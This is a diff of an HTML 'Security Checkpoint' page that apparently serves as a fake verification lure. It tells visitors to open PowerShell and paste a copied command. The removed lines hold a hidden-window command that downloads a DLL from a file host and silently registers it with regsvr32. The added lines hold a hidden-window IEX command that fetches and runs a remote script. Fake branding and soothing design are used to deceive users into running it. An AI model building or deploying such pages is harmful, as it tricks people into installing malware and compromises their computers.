@@ -3,12 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
+    <title>Security Checkpoint | LockedContent</title>
     <style>
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: #f8f9fa;
-            color: #212529;
+            background-color: #ffffff;
+            color: #333;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,105 +25,145 @@
             text-align: center;
         }
         .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            max-width: 600px;
-            border: 1px solid #dee2e6;
+            background-color: #fff;
+            padding: 50px;
+            border-radius: 8px;
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.07);
+            max-width: 650px;
+            border: 1px solid #e0e0e0;
+        }
+        .icon-container {
+            margin-bottom: 25px;
         }
         .icon {
-            font-size: 64px;
-            color: #ffc107;
-            margin-bottom: 20px;
+            font-size: 48px;
+            color: #0d6efd; /* A trustworthy blue */
+        }
+        .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(13, 110, 253, 0.3);
+            border-radius: 50%;
+            border-top-color: #0d6efd;
+            animation: spin 1s ease-in-out infinite;
+            vertical-align: middle;
+            margin-left: 10px;
         }
         h1 {
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 600;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
+            color: #1a1a1a;
+        }
+        .status {
+            font-size: 16px;
+            color: #ff6b6b;
+            font-weight: 500;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         p {
             font-size: 16px;
-            color: #495057;
+            color: #555;
             line-height: 1.6;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
+        }
+        .instruction-box {
+            background-color: #f8f9fa;
+            border-left: 4px solid #0d6efd;
+            padding: 20px 25px;
+            border-radius: 0 8px 8px 0;
+            text-align: left;
+            margin-bottom: 30px;
+        }
+        .instruction-box h3 {
+            margin-top: 0;
+            font-size: 18px;
+            color: #0d6efd;
+        }
+        .instruction-box ol {
+            padding-left: 20px;
+            margin: 0;
+        }
+        .instruction-box li {
+            margin-bottom: 12px;
+            color: #444;
+        }
+        .key {
+            background-color: #e9ecef;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: "SF Mono", Monaco, Inconsolata, "Roboto Mono", Source Code Pro, monospace;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            border: 1px solid #dee2e6;
+        }
+        .code-block-wrapper {
+            position: relative;
+            margin-bottom: 15px;
         }
         .code-block {
-            background-color: #212529;
-            color: #f8f9fa;
-            border: 1px solid #343a40;
+            background-color: #2b303b;
+            color: #c0c5ce;
+            border: 1px solid #21252b;
             border-radius: 6px;
-            padding: 15px;
-            font-family: "Cascadia Code", "Fira Code", "Courier New", Courier, monospace;
+            padding: 18px;
+            font-family: "SF Mono", Monaco, Inconsolata, "Roboto Mono", Source Code Pro, monospace;
             font-size: 13px;
-            margin: 20px 0;
-            word-wrap: break-word;
-            cursor: pointer;
-            position: relative;
             text-align: left;
-            max-height: 250px;
-            overflow-y: auto;
+            cursor: pointer;
+            user-select: all; /* Allows easy selection */
+            transition: background-color 0.2s ease;
         }
         .code-block:hover {
-            background-color: #343a40;
+            background-color: #323844;
         }
         .copy-hint {
             font-size: 12px;
-            color: #6c757d;
-            margin-top: -15px;
-            margin-bottom: 25px;
+            color: #888;
+            margin-bottom: 20px;
         }
-        .steps {
-            background-color: #f8f9fa;
-            border: 1px solid #e9ecef;
-            border-radius: 8px;
-            padding: 20px;
-            text-align: left;
-            font-size: 14px;
-            color: #495057;
-        }
-        .steps h3 {
-            margin-top: 0;
-            margin-bottom: 15px;
-            font-size: 16px;
-            color: #212529;
-        }
-        .steps ol {
-            padding-left: 20px;
-        }
-        .steps li {
-            margin-bottom: 12px;
-        }
-        .key {
-            font-weight: bold;
-            background-color: #e9ecef;
-            padding: 3px 7px;
-            border-radius: 4px;
-            border: 1px solid #ced4da;
-            font-family: monospace;
+        .footer-note {
+            font-size: 12px;
+            color: #aaa;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🔒</div>
-        <h1>System Verification Required</h1>
-        <p>Our security systems have flagged your connection. To verify your session and continue, you must run a diagnostic script. This is a mandatory security measure.</p>
-        
-        <div class="steps">
-            <h3>Instructions</h3>
+        <div class="icon-container">
+            <div class="icon">🛡️</div>
+        </div>
+        <h1>Automated Security Verification</h1>
+        <div class="status">
+            Connection Status: Unverified
+            <div class="spinner"></div>
+        </div>
+        <p>Your connection has been flagged by our automated security systems. To ensure a safe browsing experience and prevent malicious activity, you are required to run a one-time verification script.</p>
+
+        <div class="instruction-box">
+            <h3>🔧 Manual Verification Steps</h3>
+            <p style="margin-bottom: 15px; font-weight: 500;">Please follow these steps precisely to verify your session:</p>
             <ol>
-                <li><strong>Open PowerShell:</strong> Press the <span class="key">Windows Key</span>, type <strong>PowerShell</strong>, and press <span class="key">Enter</span>.</li>
-                <li><strong>Copy the Command:</strong> Click the grey box below to copy the verification command to your clipboard.</li>
-                <li><strong>Execute the Command:</strong> Right-click inside the PowerShell window and choose <strong>Paste</strong>. Press <span class="key">Enter</span> to run it.</li>
-                <li><strong>Refresh This Page:</strong> After the script completes, refresh this page to continue.</li>
+                <li>Press the <span class="key">Windows Key</span> on your keyboard.</li>
+                <li>Type <strong>PowerShell</strong> and press <span class="key">Enter</span>. A blue or black terminal window will open.</li>
+                <li>Click the code block below to copy the entire command to your clipboard.</li>
+                <li>Right-click inside the PowerShell window and select <strong>Paste</strong>, then press <span class="key">Enter</span>.</li>
             </ol>
         </div>
 
-        <div class="code-block" id="commandBlock" title="Click to copy">
-powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://files.catbox.moe/pfkryh.dll' -OutFile (Join-Path $env:TEMP 'verification.dll')); Start-Process -WindowStyle Hidden -FilePath 'regsvr32.exe' -ArgumentList ('/s ' + (Join-Path $env:TEMP 'verification.dll')); Start-Sleep -s 3" 
+        <div class="code-block-wrapper">
+            <div class="code-block" id="commandBlock" title="Click to copy">
+powershell -WindowStyle Hidden -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/YourUsername/YourRepo/main/script.ps1')"
+            </div>
         </div>
         <p class="copy-hint">(Click to copy command)</p>
+        
+        <p class="footer-note">This verification is powered by LockedContent Security Services. Your session will be automatically refreshed upon successful completion.</p>
     </div>
 
     <script>
@@ -124,12 +172,12 @@ powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(Inv
 
         commandBlock.addEventListener('click', () => {
             navigator.clipboard.writeText(commandToCopy).then(() => {
-                const originalText = commandBlock.textContent;
-                commandBlock.textContent = 'Command Copied!';
-                commandBlock.style.backgroundColor = '#28a745';
+                const originalBg = commandBlock.style.backgroundColor;
+                commandBlock.style.backgroundColor = '#28a745'; // Green flash
+                commandBlock.textContent = '✅ Command Copied to Clipboard!';
                 setTimeout(() => {
-                    commandBlock.textContent = originalText;
-                    commandBlock.style.backgroundColor = '#212529';
+                    commandBlock.style.backgroundColor = originalBg;
+                    commandBlock.textContent = commandToCopy;
                 }, 2000);
             }).catch(err => {
                 console.error('Failed to copy text: ', err);
